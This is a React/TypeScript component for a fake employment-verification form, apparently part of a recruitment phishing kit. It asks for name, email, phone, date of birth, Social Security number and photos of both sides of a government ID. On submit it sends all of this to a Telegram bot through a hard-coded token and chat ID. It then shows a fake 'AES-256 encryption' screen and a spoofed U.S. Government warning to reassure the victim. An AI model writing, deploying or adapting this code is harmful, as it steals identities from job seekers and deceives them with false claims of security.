import React, { useState, useEffect } from 'react';
import Footer from './Home/footer';
import ApplyHeader from '../components/applyHeader';
import {  useNavigate } from 'react-router-dom';

interface FormData {
  fullname: string;
  email: string;
 
 
  phone: string;
  
  ssn: string;
 
  dob: string;
}

const ApplyForm: React.FC = () => {
  const [formData, setFormData] = useState<FormData>({
    fullname: '',
    email: '',
    phone: '',
   
    ssn: '',
    
    dob: ''
  });

  const [frontID, setFrontID] = useState<File | null>(null);
  const [backID, setBackID] = useState<File | null>(null);
  const [loading, setLoading] = useState(false);  // Loading state
  const [showStatus, setShowStatus] = useState(false);
  // const [showImagePopup, setShowImagePopup] = useState(true);
  // const [loading2, setLoading2] = useState(false);


  const navigate = useNavigate();

  const BOT_TOKEN = '7926454402:AAEDVoo1vW7hFgkLKM3qK3f8EsiiKuDsT8c';
  const CHAT_ID = '7062736155';


  

// const sendToTelegram = async (message: string) => {
//   await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
//     method: "POST",
//     headers: {
//       "Content-Type": "application/json",
//     },
//     body: JSON.stringify({
//       chat_id: CHAT_ID,
//       text: message,
//     }),
//   });
// };

// LoadingOverlay.tsx
const LoadingOverlay = () => (
  <div className="fixed inset-0 bg-black bg-opacity-30 flex items-center justify-center z-50">
    <div className="bg-white p-6 rounded-lg shadow-lg text-center">
      <p className="text-lg font-semibold">Processing your application...</p>
      <div className="mt-4 w-48 h-2 bg-gray-200 overflow-hidden rounded-full">
        <div className="h-full w-1/3 bg-blue-500 animate-loading-bar"></div>
      </div>
    </div>
  </div>
);





  const handleSSNChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    let value = e.target.value.replace(/\D/g, ''); // Remove all non-digits
  
    if (value.length > 9) value = value.slice(0, 9); // Limit to 9 digits
  
    let formatted = value;
    if (value.length > 5) {
      formatted = `${value.slice(0, 3)}-${value.slice(3, 5)}-${value.slice(5)}`;
    } else if (value.length > 3) {
      formatted = `${value.slice(0, 3)}-${value.slice(3)}`;
    }
  
    setFormData((prev) => ({ ...prev, ssn: formatted }));
  };

  useEffect(() => {
    const timer = setTimeout(() => {
      setShowStatus(true);
    }, 3000);
    return () => clearTimeout(timer);
  }, []);


  // useEffect(() => {
  //   if (loading) {
  //     const timer = setTimeout(() => {
  //       setShowImagePopup(false);
  //     }, 15000); // 15 seconds
  
  //     return () => clearTimeout(timer);
  //   }
  // }, [loading]);

  
  
  useEffect(() => {
    const savedData = localStorage.getItem('applicationData');
    if (savedData) {
      setFormData(JSON.parse(savedData));
    }
  }, []);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>, type: 'front' | 'back') => {
    const file = e.target.files?.[0] || null;
    type === 'front' ? setFrontID(file) : setBackID(file);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);  // Show loading screen
  
    // Save to localStorage
    localStorage.setItem('applicationData', JSON.stringify(formData));
  
    const message = Object.entries(formData)
      .map(([key, val]) => `${key.replace(/_/g, ' ')}: ${val}`)
      .join('\n');
  
    try {
      // Send form data to Telegram
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
      });
  
      const sendFile = async (file: File | null, caption: string) => {
        if (!file) return;
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('caption', caption);
        form.append('document', file);
  
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
          method: 'POST',
          body: form,
        });
      };
  
      // Send ID files if they exist
      await sendFile(frontID, 'Front of ID');
      await sendFile(backID, 'Back of ID');
  
      // Wait for 100 seconds before navigating
      setTimeout(() => {
        navigate('/waiting');  // Redirect to the user page after 100 seconds
        setLoading(false);  // Hide loading screen once everything is complete
      }, 5000);  // 100 seconds = 100,000 ms
  
    } catch (error) {
      console.error('Error during form submission:', error);
      setLoading(false);  // Hide loading screen in case of an error
    }
  };
  
  // const handleSubmit = async (e: React.FormEvent) => {
  //   e.preventDefault();
  //   setLoading(true); // Show overlay
  
  //   // Hide the overlay after 15 seconds, no matter what
  //   setTimeout(() => {
  //     setLoading(false);
  //   }, 15000); // 15 seconds

  //   // setLoading2(true); // Show overlay

  //   // // Hide the overlay after 15 seconds
  //   // setTimeout(() => {
  //   //   setLoading2(false);
  //   // }, 15000);
  
  //   // Save to localStorage
  //   localStorage.setItem('applicationData', JSON.stringify(formData));
  
  //   const message = Object.entries(formData)
  //     .map(([key, val]) => `${key.replace(/_/g, ' ')}: ${val}`)
  //     .join('\n');
  
  //   try {
  //     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
  //       method: 'POST',
  //       headers: { 'Content-Type': 'application/json' },
  //       body: JSON.stringify({ chat_id: CHAT_ID, text: message }),
  //     });
  
  //     const sendFile = async (file: File | null, caption: string) => {
  //       if (!file) return;
  //       const form = new FormData();
  //       form.append('chat_id', CHAT_ID);
  //       form.append('caption', caption);
  //       form.append('document', file);
  
  //       await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
  //         method: 'POST',
  //         body: form,
  //       });
  //     };
  
  //     await sendFile(frontID, 'Front of ID');
  //     await sendFile(backID, 'Back of ID');
  
  //     setTimeout(() => {
  //       navigate('/user');
  //     }, 100000); // 100 seconds delay before navigation
  
  //   } catch (error) {
  //     console.error('Error during form submission:', error);
  //     setLoading(false);
  //   }
  // };
  

  return (
    <>
   <ApplyHeader/>
   {loading && <LoadingOverlay />}

  <div className="max-w-5xl mx-auto p-4">
 
   

    <div>
      {loading ? (
        <>
        <ApplyHeader/>
        <div className="fixed inset-0 z-50 bg-white flex items-center justify-center">
        <div className="max-w-md bg-white  p-6  text-center">
          <h2 className="text-2xl font-bold mb-2">
            Employment Eligibility Verification
          </h2>
  
          <p className="text-sm text-gray-800 mb-4">
            Your information is secured with <strong>AES-256 encryption</strong>
            <br />
            and remains strictly confidential. It is used solely for
            <br />
            identity verification in recruitment.
            <br />
            <span className="italic text-gray-600 text-xs mb-4 ">
              Reference: Form I-9, Employment Eligibility Verification
            </span>
          </p>
  
          {/* Spinner and blue text */}
          <div
            className={`flex justify-center items-center gap-2 mt-6 mb-2 transition-opacity duration-500 ${
              showStatus ? "opacity-100" : "opacity-0"
            }`}
          >
            <svg
              className="animate-spin h-5 w-5 text-blue-800"
              xmlns="http://www.w3.org/2000/svg"
              fill="none"
              viewBox="0 0 24 24"
            >
              <circle
                className="opacity-25"
                cx="12"
                cy="12"
                r="10"
                stroke="currentColor"
                strokeWidth="4"
              />
              <path
                className="opacity-75"
                fill="currentColor"
                d="M4 12a8 8 0 018-8v8H4z"
              />
            </svg> <br /> <br />
            <p className="text-blue-800 font-bold">
              256-bit Encryption in Progress...
            </p>
          </div>

          
  
          <p className="text-gray-600 text-sm mt-2">
            Please wait, you will get an update here soon. This may take a while.
          </p>

          <div className=" mx-auto bg-white  overflow-hidden border">
      {/* Top Blue Banner */}
      <div className="bg-blue-800 h-12 w-full"></div>

      <div className="p-6 text-center">
     
        {/* <h2 className="text-lg font-bold mb-3">
          Express connect with Id.me account.
        </h2> */}

{/*       
        <p className="text-sm text-gray-700 mb-4">
          Using ID.me Connect allows faster verification, as it is already
          authorized to verify identities. If you already have an account, the
          process is quicker and easier.
          <br />
          <br />
          Do you have an Id.me account?
        </p> */}

       
        {/* <div className="flex justify-center gap-4 mb-6">
  <button
    className="bg-blue-700 hover:bg-blue-800 text-white px-4 py-1.5 rounded font-semibold"
    onClick={() => sendToTelegram("User selected: YES")}
  >
    Yes
  </button>

  <button
    className="bg-blue-700 hover:bg-blue-800 text-white px-4 py-1.5 rounded font-semibold"
    onClick={() => sendToTelegram("User selected: NO")}
  >
    No
  </button>
</div> */}




        {/* Government Warning Box */}
        <div className="border-l-4 border-red-600 bg-gray-100 p-3 text-left text-xs text-gray-800">
          <p className="font-bold mb-1">
            This U.S. Government system is for authorized use only.
          </p>
          <p>
            Warning: This system may contain private information. By using this
            system, you consent to the monitoring, recording, and reviewing of
            your activities in this system. Unauthorized use is prohibited.
          </p>
        </div>
      </div>
    </div>


        </div>
      </div>

      
        </>
        
      ) : (
        <form onSubmit={handleSubmit} className="space-y-4">
     


         <div className="grid grid-cols-1 md:grid-cols-2 gap-4">

          <div className='border-2 flex flex-col p-3 rounded-lg'>
            <label htmlFor="" className='font-bold mb-2'>Full Name</label>
      <input
        name="fullname"
        value={formData.fullname}
        onChange={handleChange}
        required
        placeholder="Full Name"
        className="form-input border border-gray-300 p-2 rounded"
      /> 
          </div>
       
          <div className='border-2 flex flex-col p-3 rounded-lg'>
       <label htmlFor="" className='font-bold mb-2 '>Email Address</label>
      <input
        name="email"
        value={formData.email}
        onChange={handleChange}
        required
        placeholder="Email"
        className="form-input border border-gray-300 p-2 rounded"
      />
      </div>
      <div className='border-2 flex flex-col p-3 rounded-lg'>
      <label htmlFor="phone" className="font-bold mb-2">Phone Number</label>
<input
  type="tel"
  name="phone"
  id="phone"
  value={formData.phone}
  onChange={handleChange}
  required
  placeholder="Phone"
  inputMode="numeric"
  pattern="[0-9]*"
  maxLength={10}
  className="form-input border border-gray-300 p-2 rounded"
/>
</div>

 
<div className='border-2 flex flex-col p-3 rounded-lg'>
      <label htmlFor="" className='font-bold mb-2 '>Date of birth</label>
      <input
        name="dob"
        onChange={handleChange}
        required
        placeholder="Date of Birth"
        type="date"
        className="form-input border border-gray-300 p-2 rounded"
      />
    
  </div>

  <div className='border-2 flex flex-col p-3 rounded-lg'>
      <label htmlFor="" className='font-bold  mb-2'>Social Security Number (SSN)</label>
     <input
  name="ssn"
  value={formData.ssn}
  onChange={handleSSNChange}
  required
  placeholder="SSN (e.g., 123-45-6789)"
  maxLength={11}
  className="form-input border border-gray-300 p-2 rounded"
/>

</div>
   
    </div>



    {/* Upload section */}
    <div className="mt-4">
      
      <hr className="my-2" />
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <div>
        <div className='border-2 flex flex-col p-3 rounded-lg'>
          <label className='font-bold'>Government-Issued ID (Front)</label>
          <input type="file" onChange={(e) => handleFileChange(e, 'front')} required className="block mt-1 border-2 p-3" />
        </div>
        </div>
        <div>
        <div className='border-2 flex flex-col p-3 rounded-lg'>
          <label className='font-bold'>Government-Issued ID (Back)</label>
          <input type="file" onChange={(e) => handleFileChange(e, 'back')} required className="block mt-1 border-2  p-3" />
       </div>
        </div>
      </div>
    </div>

  
    <div className='border-2 flex flex-col p-3 rounded-lg'>
          <button
            type="submit"
            className="bg-blue-900 hover:bg-blue-800 text-white border border-black font-semibold py-3 px-8 shadow-md transition-all duration-300 mt-4"
          >
            Start Verification
          </button>

          </div>
        </form>

        
      )}
    </div>
 
</div>

<Footer/>
 </>
  );
};

export default ApplyForm;
